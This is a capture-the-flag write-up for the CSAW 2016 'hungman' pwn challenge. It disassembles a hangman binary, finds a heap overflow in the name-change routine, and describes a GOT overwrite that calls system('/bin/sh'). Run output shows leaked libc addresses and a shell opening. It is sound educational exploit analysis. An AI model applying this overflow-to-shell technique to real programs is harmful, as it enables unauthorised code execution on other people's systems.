## CSAW CTF 2016 - hungman (Pwn 300pt)
##### 16/09 - 18/09/2016 (48hr)
___

### Description: 
    nc pwn.chal.csaw.io 8003
    
### Solution

After playing a little bit with the program, we can easily find out that this is hangman game (the
name of the challenge also gives a hint).

First of all function get_name_400F2D is called to read user's name:
```assembly
.text:0000000000400A8C     mov     eax, 0
.text:0000000000400A91     call    get_name_400F2D
.text:0000000000400A96     mov     cs:player_obj_6020E0, rax
.text:0000000000400A9D     mov     rax, cs:player_obj_6020E0
.text:0000000000400AA4     mov     rax, [rax+8]                ; get name
.text:0000000000400AA8     mov     rsi, rax
.text:0000000000400AAB     mov     edi, offset format          ; "Welcome %s\n"
.text:0000000000400AB0     mov     eax, 0
.text:0000000000400AB5     call    _printf
```

get_name_400F2D(), allocates buffer in the heap, big enough (up to 0xf7) for the name (no 
overflows here). Then it also allocates a special object (let's call it play_obj) 
(128B long) with the following fields:
```
    offset  0: player's score
    offset  4: name length
    offset  8: pointer to name
    offset 16: bitmap with guessed letters
```

Then we enter the main game loop:
```assembly
.text:0000000000400ABA LOOP_400ABA:                            ; CODE XREF: main_400A0D+11Ej
.text:0000000000400ABA     mov     rax, cs:player_obj_6020E0
.text:0000000000400AC1     mov     edx, [rbp+ur_fd]
.text:0000000000400AC4     mov     esi, edx                    ; arg2: urandom fd
.text:0000000000400AC6     mov     rdi, rax                    ; arg1: player object
.text:0000000000400AC9     call    play_hangman_400B3A
.....
.text:0000000000400B28     jz      short BREAK_400B2D
.text:0000000000400B2A     nop
.text:0000000000400B2B     jmp     short LOOP_400ABA
```

play_hangman_400B3A() implements one "play" of the game. The first job of this function is to
generate a word with random letters (/dev/urandom is used for that). The size of this word
will be a long as the name:

```assembly
.text:0000000000400B4D     mov     eax, [rax+4]                ; get name length
.text:0000000000400B50     mov     [rbp+namelen_3C], eax
.text:0000000000400B53     mov     eax, [rbp+namelen_3C]
.text:0000000000400B56     cdqe
.text:0000000000400B58     mov     rdi, rax                    ; size
.text:0000000000400B5B     call    _malloc
.text:0000000000400B60     mov     [rbp+buf], rax
.text:0000000000400B64     cmp     [rbp+buf], 0
.text:0000000000400B69     jz      locret_400F2B

.text:0000000000400B6F     mov     eax, [rbp+namelen_3C]
.text:0000000000400B72     movsxd  rdx, eax                    ; nbytes
.text:0000000000400B75     mov     rcx, [rbp+buf]
.text:0000000000400B79     mov     eax, [rbp+fd]
.text:0000000000400B7C     mov     rsi, rcx                    ; buf
.text:0000000000400B7F     mov     edi, eax                    ; fd
.text:0000000000400B81     call    _read                       ; read strlen(name) random bytes
.text:0000000000400B86     mov     [rbp+var_30], 0
.text:0000000000400B8E     jmp     short loc_400C07
.text:0000000000400B90 ; ---------------------------------------------------------------------------
.text:0000000000400B90
.text:0000000000400B90 GEN_WORD_400B90:                        ; CODE XREF: play_hangman_400B3A+D9j
.text:0000000000400B90     mov     rax, [rbp+var_30]           ; generate a random word
.....
.text:0000000000400C0F     cmp     rax, [rbp+var_30]
.text:0000000000400C13     ja      GEN_WORD_400B90             ; generate a random word
```

After we generate the word, we give 3 wrong attemps to the user:
```assembly
    .text:0000000000400C19     mov     [rbp+attemps_44], 3
```

The next step is to print the word. The bitmap array that we mentioned in above, is 26 bytes
long and contains 1 entry for each letter a-z. If user guesses correctly one letter, let's 
say 'k', then bitmap['k' - 'a'] = 1. Otherwise is 0. So, if bitmap[word[i] - 'a'] is 0 then
an underscore is printed, otherwise the (already) found letter is printed:
```assembly
.text:0000000000400C3A PRINT_WORD_400C3A:                      ; CODE XREF: play_hangman_400B3A+167j
.text:0000000000400C3A     mov     rax, [rbp+iter_28]
.text:0000000000400C3E     mov     rdx, [rbp+buf]
.text:0000000000400C42     add     rax, rdx
.text:0000000000400C45     movzx   eax, byte ptr [rax]
.text:0000000000400C48     movsx   eax, al
.text:0000000000400C4B     sub     eax, 61h
.text:0000000000400C4E     mov     rdx, [rbp+player_obj_ptr_58]
.text:0000000000400C52     cdqe
.text:0000000000400C54     movzx   eax, byte ptr [rdx+rax+10h] ; player_obj.bitmap[word[i] - 'a'] == 0?
.text:0000000000400C59     test    al, al
.text:0000000000400C5B     jz      short DONT_PRINT_400C7C
.text:0000000000400C5D     mov     rax, [rbp+iter_28]          ; print letter
.text:0000000000400C61     mov     rdx, [rbp+buf]
.text:0000000000400C65     add     rax, rdx
.text:0000000000400C68     mov     edx, 1                      ; n
.text:0000000000400C6D     mov     rsi, rax                    ; buf
.text:0000000000400C70     mov     edi, 1                      ; fd
.text:0000000000400C75     call    _write
.text:0000000000400C7A     jmp     short loc_400C90
.text:0000000000400C7C ; ---------------------------------------------------------------------------
.text:0000000000400C7C
.text:0000000000400C7C DONT_PRINT_400C7C:                      ; CODE XREF: play_hangman_400B3A+121j
.text:0000000000400C7C     mov     edx, 1                      ; n
.text:0000000000400C81     mov     esi, offset a_              ; "_"
.text:0000000000400C86     mov     edi, 1                      ; fd
.text:0000000000400C8B     call    _write
.text:0000000000400C90
.text:0000000000400C90 loc_400C90:                             ; CODE XREF: play_hangman_400B3A+140j
.text:0000000000400C90     add     [rbp+iter_28], 1
.text:0000000000400C95
.text:0000000000400C95 PRINT_WORD_END_400C95:                  ; CODE XREF: play_hangman_400B3A+FEj
.text:0000000000400C95     mov     eax, [rbp+namelen_3C]
.text:0000000000400C98     sub     eax, 1
.text:0000000000400C9B     cdqe
.text:0000000000400C9D     cmp     rax, [rbp+iter_28]
.text:0000000000400CA1     ja      short PRINT_WORD_400C3A
```

Then program waits from the user to give a character which must be in [a-z]:
```assembly
.....
.text:0000000000400CB7     lea     rax, [rbp+char_46]
.text:0000000000400CBB     mov     rsi, rax
.text:0000000000400CBE     mov     edi, offset aC              ; " %c"
.text:0000000000400CC3     mov     eax, 0
.text:0000000000400CC8     call    ___isoc99_scanf
.text:0000000000400CCD     movzx   eax, [rbp+char_46]
.text:0000000000400CD1     cmp     al, 60h                     ; character must be [a-z]
.text:0000000000400CD3     jle     short INVALID_CHAR_400CDD
.text:0000000000400CD5     movzx   eax, [rbp+char_46]
.text:0000000000400CD9     cmp     al, 7Ah
.text:0000000000400CDB     jle     short CHAR_OK_400CF0
.text:0000000000400CDD
.....
.text:0000000000400CF0 CHAR_OK_400CF0:                         ; CODE XREF: play_hangman_400B3A+1A1j
.text:0000000000400CF0     movzx   eax, [rbp+char_46]
.text:0000000000400CF4     movsx   eax, al
.text:0000000000400CF7     sub     eax, 61h                    ; index character
.text:0000000000400CFA     mov     rdx, [rbp+player_obj_ptr_58]
.text:0000000000400CFE     cdqe
.text:0000000000400D00     movzx   eax, byte ptr [rdx+rax+10h] ; player_obj.bitmap[char - 'a'] == 0?
.text:0000000000400D05     test    al, al
.text:0000000000400D07     jz      short CHAR_GIVEN_400D1C
.text:0000000000400D09     mov     edi, offset s               ; "nope"
.text:0000000000400D0E
.text:0000000000400D0E loc_400D0E:
.text:0000000000400D0E     call    _puts
.text:0000000000400D13     sub     [rbp+attemps_44], 1
.text:0000000000400D17     jmp     MORE_TOGO_400DC1
.text:0000000000400D1C
.text:0000000000400D1C CHAR_GIVEN_400D1C: 
```

Then we scan the the hidden word letter by letter and we check if the user's letter matches
anywhere:
```assembly
.text:0000000000400D2C MATCH_CHAR_400D2C:                      ; CODE XREF: play_hangman_400B3A+232j
.text:0000000000400D2C     mov     rax, [rbp+iter_20]
.text:0000000000400D30     mov     rdx, [rbp+buf]
.text:0000000000400D34     add     rax, rdx
.text:0000000000400D37     movzx   edx, byte ptr [rax]
.text:0000000000400D3A     movzx   eax, [rbp+char_46]
.text:0000000000400D3E     cmp     dl, al                      ; word[i] == char?
.text:0000000000400D40     jnz     short CH_NOT_FOUND_400D5B
.text:0000000000400D42     movzx   eax, [rbp+char_46]
.text:0000000000400D46     movsx   eax, al
.text:0000000000400D49     sub     eax, 61h
.text:0000000000400D4C     mov     rdx, [rbp+player_obj_ptr_58]
.text:0000000000400D50     cdqe
.text:0000000000400D52     mov     byte ptr [rdx+rax+10h], 1
.text:0000000000400D57     add     [rbp+found_40], 1
.text:0000000000400D5B
.text:0000000000400D5B CH_NOT_FOUND_400D5B:                    ; CODE XREF: play_hangman_400B3A+206j
.text:0000000000400D5B     add     [rbp+iter_20], 1
.text:0000000000400D60
.text:0000000000400D60 loc_400D60:                             ; CODE XREF: play_hangman_400B3A+1F0j
.text:0000000000400D60     mov     eax, [rbp+namelen_3C]
.text:0000000000400D63     sub     eax, 1
.text:0000000000400D66     cdqe
.text:0000000000400D68     cmp     rax, [rbp+iter_20]
.text:0000000000400D6C     ja      short MATCH_CHAR_400D2C
```

If the word doesn't contain this letter, then we decrement the number of attempts. 
We actually compare the letters found between current and previous round and 
if they're equal, then we can infer that no new letters were found:
```assembly
.text:0000000000400D6E     mov     eax, [rbp+prev_found_38]
.text:0000000000400D71     cmp     eax, [rbp+found_40]
.text:0000000000400D74     jnz     short SOMETHING_FOUND_400D7A
.text:0000000000400D76     sub     [rbp+attemps_44], 1         ; if no chars found, reduce attempts
.text:0000000000400D7A
.text:0000000000400D7A SOMETHING_FOUND_400D7A:                 ; CODE XREF: play_hangman_400B3A+23Aj
```

After that, we check if all characters have found, or if user spend all of his attempts:
```assembly
.text:0000000000400D7A     mov     eax, [rbp+namelen_3C]
.text:0000000000400D7D     sub     eax, 1
.text:0000000000400D80     cmp     eax, [rbp+found_40]         ; all characters found?
.text:0000000000400D83     jg      short MORE_TOGO_400DC1
.....
        ; user found all characters

.text:0000000000400DC1
.text:0000000000400DC1 MORE_TOGO_400DC1:                       ; CODE XREF: play_hangman_400B3A+F1j
.text:0000000000400DC1                                         ; play_hangman_400B3A+1B1j ...
.text:0000000000400DC1     cmp     [rbp+attemps_44], 0
.text:0000000000400DC5     jg      PLAY_LOOP_400C30
        ; game ended without all characters revealed
```


In any case, if the game ends then the score get's calculated. If user doesn't find the
word, he get's a score of: namelen*found / 4:
```assembly
.text:0000000000400DCB     mov     rax, [rbp+player_obj_ptr_58] ; game ended here: get score
.text:0000000000400DCF     mov     eax, [rax]                  ; player_obj.score (offset 0)
.text:0000000000400DD1     cvtsi2sd xmm1, eax                  ; xmm1 = score
.text:0000000000400DD5     cvtsi2sd xmm2, [rbp+found_40]       ; xmm2 = found
.text:0000000000400DDA     mov     eax, [rbp+namelen_3C]
.text:0000000000400DDD     sub     eax, 1
.text:0000000000400DE0     cvtsi2sd xmm0, eax                  ; xmm0 = namelen
.text:0000000000400DE4     movsd   xmm3, cs:CONST_1_4011A0     ; xmm3 = 0.25 (const)
.text:0000000000400DEC     mulsd   xmm0, xmm3
.text:0000000000400DF0     mulsd   xmm0, xmm2
.text:0000000000400DF4     addsd   xmm0, xmm1
.text:0000000000400DF8     cvttsd2si edx, xmm0                 ; edx = 0.25*len*found + score
.text:0000000000400DFC     mov     rax, [rbp+player_obj_ptr_58]
.text:0000000000400E00     mov     [rax], edx                  ; score += namelen*found / 4
```

And if he finds the word he gets a score of 8*namelen:
```assembly
.text:0000000000400D89     mov     eax, [rax]
.text:0000000000400D8B     cvtsi2sd xmm1, eax
.text:0000000000400D8F     mov     eax, [rbp+namelen_3C]
.text:0000000000400D92     sub     eax, 1
.text:0000000000400D95     cvtsi2sd xmm0, eax                  ; xmm0 = namelen
.text:0000000000400D99     movsd   xmm2, cs:CONST_1_4011A0     ; xmm2 = 0.25
.text:0000000000400DA1     mulsd   xmm0, xmm2
.text:0000000000400DA5     movsd   xmm2, cs:CONST_2_4011A8     ; xmm2 = 32
.text:0000000000400DAD     mulsd   xmm0, xmm2
.text:0000000000400DB1     addsd   xmm0, xmm1
.text:0000000000400DB5     cvttsd2si edx, xmm0
.text:0000000000400DB9     mov     rax, [rbp+player_obj_ptr_58] ; edx = 0.25*len*32 + score
.text:0000000000400DBD     mov     [rax], edx                  ; score += 8*len
```

Now, if the score becomes greater than default highscore (64) then the user is asked to change
his name if he wants to:
```assembly
.text:0000000000400E02 HIGHSCORE_400E02:                       ; CODE XREF: play_hangman_400B3A+285j
.text:0000000000400E02     mov     rax, [rbp+player_obj_ptr_58]
.text:0000000000400E06     mov     edx, [rax]
.text:0000000000400E08     mov     eax, cs:highscore_602300
.text:0000000000400E0E     cmp     edx, eax
.text:0000000000400E10     jle     NOT_HIGHSCORE_400F05
.text:0000000000400E16     mov     edi, offset aHighScoreChang ; "High score! change name?"
.text:0000000000400E1B     call    _puts
.....
.text:0000000000400E3C     jnz     NO_NAME_CHANGE_400ED5
.text:0000000000400E42     mov     edi, 0F8h                   ; size
.text:0000000000400E47     call    _malloc
.text:0000000000400E4C     mov     [rbp+s], rax
.text:0000000000400E50     mov     rax, [rbp+s]
.text:0000000000400E54     mov     edx, 0F8h                   ; n
.text:0000000000400E59     mov     esi, 0                      ; c
.text:0000000000400E5E     mov     rdi, rax                    ; s
.text:0000000000400E61     call    _memset
.text:0000000000400E66     mov     rax, [rbp+s]
.text:0000000000400E6A     mov     edx, 0F8h                   ; nbytes
.text:0000000000400E6F     mov     rsi, rax                    ; buf
.text:0000000000400E72     mov     edi, 0                      ; fd
.text:0000000000400E77     call    _read
.text:0000000000400E7C     mov     [rbp+var_34], eax
.text:0000000000400E7F
.text:0000000000400E7F loc_400E7F:
.text:0000000000400E7F     mov     rax, [rbp+player_obj_ptr_58]
.text:0000000000400E83     mov     edx, [rbp+var_34]
.text:0000000000400E86     mov     [rax+4], edx
.text:0000000000400E89     mov     rax, [rbp+s]
.text:0000000000400E8D     mov     esi, 0Ah                    ; c
.text:0000000000400E92     mov     rdi, rax                    ; s
.text:0000000000400E95     call    _strchr
.text:0000000000400E9A     mov     [rbp+var_8], rax
.text:0000000000400E9E     cmp     [rbp+var_8], 0
.text:0000000000400EA3     jz      short loc_400EAC
.text:0000000000400EA5     mov     rax, [rbp+var_8]
.text:0000000000400EA9     mov     byte ptr [rax], 0
.text:0000000000400EAC
.text:0000000000400EAC loc_400EAC:                             ; CODE XREF: play_hangman_400B3A+369j
.text:0000000000400EAC     mov     eax, [rbp+var_34]
.text:0000000000400EAF     movsxd  rdx, eax                    ; n
.text:0000000000400EB2     mov     rax, [rbp+player_obj_ptr_58]
.text:0000000000400EB6     mov     rax, [rax+8]
.text:0000000000400EBA     mov     rcx, [rbp+s]
.text:0000000000400EBE     mov     rsi, rcx                    ; src
.text:0000000000400EC1     mov     rdi, rax                    ; dest
.text:0000000000400EC4     call    _memcpy                     ; overflow!
.text:0000000000400EC9     mov     rax, [rbp+s]
.text:0000000000400ECD     mov     rdi, rax                    ; ptr
.text:0000000000400ED0     call    _free
.text:0000000000400ED5
.text:0000000000400ED5 NO_NAME_CHANGE_400ED5:                  ; CODE XREF: play_hangman_400B3A+302j
.text:0000000000400ED5     mov     rax, [rbp+player_obj_ptr_58]
.text:0000000000400ED9     mov     rax, [rax+8]
.text:0000000000400EDD     mov     rcx, rax
.text:0000000000400EE0     mov     edx, offset aHighestPlayerS ; "Highest player: %s"
.text:0000000000400EE5     mov     esi, 200h                   ; maxlen
.text:0000000000400EEA     mov     edi, offset highscore_602100 ; s
.text:0000000000400EEF     mov     eax, 0
.text:0000000000400EF4     call    _snprintf
.text:0000000000400EF9     mov     rax, [rbp+player_obj_ptr_58]
.text:0000000000400EFD     mov     eax, [rax]
.text:0000000000400EFF     mov     cs:highscore_602300, eax
.text:0000000000400F05
.text:0000000000400F05 NOT_HIGHSCORE_400F05:                   ; CODE XREF: 
```

That's pretty much all what the game does. Let's move on...
___

### The vulnerability
If you're careful, you might notice the vulnerability in the above assembly snippet: Program
assumes that the new name of the user won't be greater that current name. If for example
initial name is 10 characters long and we win a game, then we can set a name up to 0xf8
characters long, thus overflowing the buffer of the name. Because name buffer is allocated
BEFORE play_obj, it means that it will be higher in the heap. Thus it's possible to
overwrite the name pointer within play_obj.

### The flaw
All good so far, but in order to trigger the vulnerability we have to get a score higher
than 64. We don't need to win to get that score; If we play for a long time and we 
guess some letters before we lose, we can eventually get a higher score.

But we don't have to do that, as the program has a flaw that allow us to win very easily.
The length of the hidden word is as big as the name that we give => we can manipulate it.
Hidden word contains only letters [a-z], and these are coming from a strong PRG.

So what if we set a word with 100+ letters? It's very likely that all the letters will
appear at least once. Thus we can start sending all letters from a to z until we guess
all of them. Our score will be very high as the word will have > 100 characters.

### Arbitrary read/write primitives
Once we set a bigger name and we overwrite the name pointer in player_obj, then we can
easily get an arbitrary read as the program displays the name of the highest player:

```assembly
.text:0000000000400ED5     mov     rax, [rbp+player_obj_ptr_58]
.text:0000000000400ED9     mov     rax, [rax+8]
.text:0000000000400EDD     mov     rcx, rax
.text:0000000000400EE0     mov     edx, offset aHighestPlayerS ; "Highest player: %s"
.text:0000000000400EE5     mov     esi, 200h                   ; maxlen
.text:0000000000400EEA     mov     edi, offset highscore_602100 ; s
.text:0000000000400EEF     mov     eax, 0
.text:0000000000400EF4     call    _snprintf
.text:0000000000400EF9     mov     rax, [rbp+player_obj_ptr_58]
.text:0000000000400EFD     mov     eax, [rax]
.text:0000000000400EFF     mov     cs:highscore_602300, eax
```

If we play the game for a second time and win it again, then we can change our name
again. But this time the write will be happen where the name pointer of the player_obj
points to, which this gives us an arbitrary write.

### Exploitation process
This first though is .got overwrite. But the requirement is a partial RELRO. Let's check
this:
```
root@nogirl:/home/ispo/ctf/csaw_16# /opt/checksec.sh --file hungman
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   hungman
```

Nice. So we can do a .got overwrite.

The easy plan is to overwrite .got.free(), during memcpy() at 0x400ec4 and the immediatelly
jump into it:
```assembly
.text:0000000000400EC4     call    _memcpy                     ; overflow!
.text:0000000000400EC9     mov     rax, [rbp+s]
.text:0000000000400ECD     mov     rdi, rax                    ; ptr
.text:0000000000400ED0     call    _free
```

This sounds good, but there's a small problem: When free() is called, it will take as 
an argument the start address of our overflowed buffer, which actually points to .got.free().
Thus the argument won't be /bin/sh. So we need to point the buffer above got.free(), having enough 
space to add the /bin/sh, and then overflow free(). This sounds good, but we cannot get a leak as 
free() is the first entry in libc. I'm sure that there will be an easier solution, but that 
moment I wasn't able to think about it.

So, we have a total control of the whole GOT, so we can totally screw the control flow of the 
program. What we want is to transfer control to a function that takes a pointer as a first
argument. We also need to control the contents of that pointer.

If we go back and take a look at available function in GOT, we can see that setvbuf() and
memset() are good candidates. setvbuf() takes a FILE* pointer as an argument which is 
located at:
```assembly
.bss:00000000006020C0 ; FILE *stdout

.text:0000000000400A15     mov     rax, cs:stdout
.text:0000000000400A1C     mov     ecx, 0                      ; n
.text:0000000000400A21     mov     edx, 2                      ; modes
.text:0000000000400A26     mov     esi, 0                      ; buf
.text:0000000000400A2B     mov     rdi, rax                    ; stream
.text:0000000000400A2E     call    _setvbuf
.text:0000000000400A33     mov     edx, 200h       
```

which is right below .got (actually .data is between but it's pretty small), so we can
overflow it. memset() in main is also an option as the it takes as an argument the
highscore array:
```assembly
.bss:0000000000602100 highscore_602100 db 200h dup(?)         ; DATA XREF: main_400A0D+30o

.text:0000000000400A33     mov     edx, 200h                   ; n
.text:0000000000400A38     mov     esi, 0                      ; c
.text:0000000000400A3D     mov     edi, offset highscore_602100 ; s
.text:0000000000400A42     call    _memset
```

So all we have to do is to overwrite free() with an address in main(), either 0x400A33
for memset() of 0x400A15 for setvbuf(). This sounds great, but these addresses contain
0a, so we can't actually overwrite them, because read() will stop reading on new line:
```
.text:0000000000400E77     call    _read
```

Instead of returning to main(), we can return to start() which calls main() through 
libc_start_main. Then we can indirectly end up in main() get execute setvbuf() with
/bin/sh as an argument. Solution is not that trivial; take a look at exploit file
for more details.

However we need to overwrite the whole GOT until we reach address 0x6020C0, we need to
restore address of libc_start_main. Once we do that we can call system to get a shell.


##### A weird detail.
After all shell was open, but I couldn't execute any commands. Running the program
locally, revealed this message in stderr upon exploit termination:
```
    /bin/sh: 3: Syntax error: EOF in backquote substitution
```

I have no idea why this happened, as it was clear that system("/bin/sh\x00") was 
called. But if we look at it seems that we're in backtick. So if we write as the
first command a backtick followed by a semicolon we can execute our commands
and get the flag: **flag{this_looks_like_its_a_well_hungman}**

For more details see the exploit file.

### Getting the flag

```
root@nogirl:~/ctf/csaw_16# ./hungman_expl.py 
[+] Winning the game once...
[+] Leaking address of free():  0x7f9776b85a70
___a__________________________________________________a___________________________________________a__a______________________________a_____________a______________________________________________a_______________________________________________________________________________________________a_____
___a___________________b______________________________a___________________________________________a__a______b_______________________a__________bb_a___b____________________b___b_________________abb_____b_______b_____b_______________________________________b________b______________b_________ab____
___a_c___c__c_c________b______________________________a______c_____c______________________c_______a__a______b_______________________a______cc__bb_a___b_____c______________b___b_________________abb_____b____c__b_____b_______________________________________b__c_____b______________b_________ab____
___a_c___c__c_c____d___b_________________________dd___a_____dc___d_c_____________________dc_______a_da______b____d__________________a______cc__bb_a___b_____c______________b___b_________________abb_____b____c__b____db_______________________________________b__c_____b______________b_________ab____
___a_c___c__c_c____d___b_________________________dd_e_a_____dce__d_c____________e________dc_______a_da_e____b____d__________________a______cc__bb_a___b_____c______________b___b_________________abb_____b____c__b____db_______________________________________b__c_____b______________b_________ab____
___a_c___c__c_c____d__fb______f________________f_dd_e_a_____dce__d_c_____f____f_e________dc_______a_da_e____b____d_______________f__a____f_cc__bb_a___b_____c______________b___b___f_____________abb_____b_f__cf_b_f__db____f___________________ff_____________b__c_____b______________b_________ab____
___a_c___c__c_c____d__fb___gg_f_________g______f_dd_e_a_____dce__d_c_____f_gg_f_e________dc_____g_a_da_e____b____d_____g_________f__a____f_cc__bb_a___b_____c______________b_ggb___f__________g__abb_____b_f__cf_b_f__db____f______________g____ff_____________b__c_____b____________g_b______g__ab____
___a_c___c__c_c____d__fb___gg_f_________g__h__hf_dd_e_a_____dce__d_c_____f_gg_f_e_h______dc_____g_a_da_e____b____d_____g_________f__a____f_cc__bb_a_h_b_____c______________b_ggb___f__________g__abb____hb_f__cf_b_f__db___hf______________g_h__ff_h___________b__c____hb___h_______hg_b______g__ab____
___a_c___c__c_c____d__fb___gg_f_i_______g__h__hf_ddie_a___i_dce__d_c___i_f_gg_f_e_h______dc_____g_a_da_e__i_b_i__d_i_i_g_________f__a____f_cc__bb_a_h_b____ic____________i_b_ggb___f_______i__g__abb____hb_fi_cf_b_fi_db___hf______________g_h__ff_h______i___ib__c__i_hb___h_i_____hg_b___i__g_iab_i__
___a_c___c__c_c____d__fbjjjggjfji_______g__h__hf_ddie_a___i_dce__d_cj__i_f_gg_f_e_h______dc_____gja_da_e__ijb_i__d_i_i_g_________f__a____f_cc_jbb_a_h_b____ic____________i_b_ggb___f_______i__g__abb_j__hb_fijcf_b_fi_db___hf______________g_h__ff_h__jj__i___ib__c__i_hb__jh_i_____hg_b___i__g_iab_i__
___a_c___c__c_c___kd__fbjjjggjfji_______g__h__hf_ddie_a___i_dce__dkcj__i_f_gg_f_e_h__k___dc_____gja_dake__ijb_i__d_i_i_g_________f__a____f_cc_jbb_a_hkb_k__ic____________i_b_ggb___f___k___i__g__abb_j__hb_fijcf_b_fi_db___hfk_____k___k___g_h__ff_h__jj__i___ib__c__i_hb__jh_i_____hg_b___i__g_iab_i__
___a_c___c__c_c___kd_lfbjjjggjfji_______g__h__hf_ddie_a___i_dce__dkcjl_i_f_gg_f_e_h__k___dc_____gja_dakel_ijb_i__d_i_i_g____l____f__a____f_cc_jbb_a_hkb_k__icl__l_l______i_b_ggb___f___k___i__g_labb_j__hb_fijcf_b_fi_db___hfk____lk___k___g_h__ff_h__jj__i___ib_lc__i_hb__jh_i_____hg_b___i_lgliab_i__
___a_c___c__c_c___kd_lfbjjjggjfji_______g__h__hfmddie_a___i_dce__dkcjl_i_fmggmf_e_h__k___dc_____gja_dakel_ijb_i__d_i_i_g___ml_m__f__a____f_ccmjbb_a_hkb_k__icl__l_l______i_b_ggbm__f___k___i__g_labb_j__hb_fijcf_b_fi_db___hfk____lkm__k___g_h__ff_h__jj__i___ib_lc__i_hb__jh_i_____hg_b___i_lgliab_imm
___a_c___c__c_c___kd_lfbjjjggjfji_______g_nh__hfmddie_ann_i_dce__dkcjlni_fmggmf_e_h__k___dc____ngja_dakelnijb_i__d_i_i_g___mlnm__fn_a____f_ccmjbb_a_hkb_k__icl_nl_l______i_b_ggbm__f___k___i__g_labb_j__hb_fijcf_b_fi_db___hfkn_n_lkm__k___g_h__ff_h__jj__in__ib_lc__i_hb__jh_i_____hg_b___i_lgliab_imm
__oa_c___c__c_c___kd_lfbjjjggjfji_______g_nh__hfmddie_ann_iodce__dkcjlniofmggmf_e_h__k___dc__o_ngja_dakelnijb_i__d_i_iog___mlnm__fn_a___of_ccmjbboa_hkb_k__icl_nl_l______i_boggbm__f___k___io_g_labb_j__hb_fijcf_b_fi_db___hfkn_n_lkmo_k___g_h__ff_ho_jj__in__ib_lc__i_hb__jh_i_____hg_b___i_lgliaboimm
__oapc___c__c_c___kd_lfbjjjggjfji_______g_nh__hfmddie_annpiodce__dkcjlniofmggmf_e_h__k__pdc__o_ngjapdakelnijbpi_pd_i_iog___mlnm__fn_a___of_ccmjbboa_hkb_k__icl_nl_l___p__i_boggbmp_f___k___io_g_labb_j__hb_fijcf_b_fi_db___hfkn_n_lkmo_k___g_h__ff_ho_jj__in__ib_lc__i_hb__jh_i_____hg_b___i_lgliaboimm
_qoapcq_qc__c_c___kd_lfbjjjggjfji_______gqnh__hfmddie_annpiodce_qdkcjlniofmggmf_e_h_qk__pdc__o_ngjapdakelnijbpi_pd_i_iog___mlnm__fn_a_qqof_ccmjbboa_hkb_k__icl_nl_l___p_qi_boggbmp_fqq_k___io_g_labb_jq_hb_fijcf_b_fi_db___hfkn_n_lkmo_k___g_h__ff_hoqjj__in__ib_lc__i_hb__jh_i_____hg_b__qi_lgliaboimm
_qoapcq_qc__c_c___kd_lfbjjjggjfji__rr___gqnhr_hfmddie_annpiodce_qdkcjlniofmggmf_e_h_qk__pdc__o_ngjapdakelnijbpi_pd_i_iogr_rmlnm_rfn_a_qqof_ccmjbboa_hkb_k__icl_nl_l___p_qi_boggbmp_fqq_k___io_grlabb_jq_hb_fijcfrb_fi_db___hfkn_n_lkmo_k__rg_h__ff_hoqjj__in_rib_lc__i_hb__jh_i____rhg_br_qi_lgliaboimm
_qoapcq_qc__c_c___kd_lfbjjjggjfji__rr___gqnhr_hfmddie_annpiodce_qdkcjlniofmggmf_e_h_qk__pdc__o_ngjapdakelnijbpi_pdsi_iogr_rmlnm_rfn_asqqof_ccmjbboa_hkb_ks_icl_nl_l___p_qisboggbmpsfqq_k___io_grlabb_jq_hb_fijcfrb_fi_db_s_hfkn_n_lkmosk__rg_h__ffshoqjj_sin_rib_lc__i_hb__jh_i_s__rhg_brsqi_lgliaboimm
_qoapcq_qc__c_c___kd_lfbjjjggjfji__rrt__gqnhr_hfmddie_annpiodce_qdkcjlniofmggmf_eth_qkt_pdc__o_ngjapdakelnijbpi_pdsi_iogr_rmlnm_rfn_asqqof_ccmjbboa_hkb_ks_icl_nl_l___p_qisboggbmpsfqq_k___io_grlabb_jq_hb_fijcfrb_fi_db_s_hfkntn_lkmosk__rg_h__ffshoqjj_sin_rib_lc__i_hb__jh_i_s__rhg_brsqitlgliaboimm
_qoapcq_qcu_c_c___kd_lfbjjjggjfji__rrt__gqnhruhfmddie_annpiodceuqdkcjlniofmggmf_eth_qktupdc__oungjapdakelnijbpiupdsi_iogr_rmlnm_rfn_asqqof_ccmjbboa_hkb_ksuicl_nl_l___puqisboggbmpsfqq_k_u_io_grlabb_jq_hb_fijcfrb_fi_db_s_hfkntn_lkmosku_rg_h__ffshoqjjusin_rib_lc__iuhb__jhuiusuurhgubrsqitlgliaboimm
_qoapcqvqcu_cvcv__kd_lfbjjjggjfjivvrrt__gqnhruhfmddie_annpiodceuqdkcjlniofmggmfveth_qktupdc__oungjapdakelnijbpiupdsi_iogr_rmlnm_rfn_asqqof_ccmjbboa_hkb_ksuicl_nl_l___puqisboggbmpsfqqvkvu_io_grlabb_jq_hbvfijcfrbvfi_db_s_hfkntnvlkmoskuvrg_h_vffshoqjjusin_rib_lc__iuhb__jhuiusuurhgubrsqitlgliaboimm
_qoapcqvqcu_cvcv__kd_lfbjjjggjfjivvrrt__gqnhruhfmddiewannpiodceuqdkcjlniofmggmfvethwqktupdc__oungjapdakelnijbpiupdsi_iogrwrmlnm_rfnwasqqof_ccmjbboa_hkb_ksuicl_nl_lw__puqisboggbmpsfqqvkvu_io_grlabbwjq_hbvfijcfrbvfi_db_s_hfkntnvlkmoskuvrgwhwvffshoqjjusin_rib_lc__iuhb__jhuiusuurhgubrsqitlgliaboimm
_qoapcqvqcu_cvcvx_kd_lfbjjjggjfjivvrrtxxgqnhruhfmddiewannpiodceuqdkcjlniofmggmfvethwqktupdcx_oungjapdakelnijbpiupdsi_iogrwrmlnm_rfnwasqqof_ccmjbboa_hkbxksuiclxnl_lwx_puqisboggbmpsfqqvkvu_ioxgrlabbwjq_hbvfijcfrbvfi_db_sxhfkntnvlkmoskuvrgwhwvffshoqjjusinxrib_lc_xiuhb_xjhuiusuurhgubrsqitlgliaboimm
yqoapcqvqcu_cvcvxykdylfbjjjggjfjivvrrtxxgqnhruhfmddiewannpiodceuqdkcjlniofmggmfvethwqktupdcx_oungjapdakelnijbpiupdsi_iogrwrmlnmyrfnwasqqofyccmjbboa_hkbxksuiclxnlylwxypuqisboggbmpsfqqvkvuyioxgrlabbwjqyhbvfijcfrbvfi_db_sxhfkntnvlkmoskuvrgwhwvffshoqjjusinxribylc_xiuhb_xjhuiusuurhgubrsqitlgliaboimm
High score! change name?

[+] free() at 0x7f9776b85a70
[+] system() at 0x7f9776b47380
[+] __libc_start_main() at 0x7f9776b22740

[+] Overwriting GOT...
[+] Opening Shell...
    id
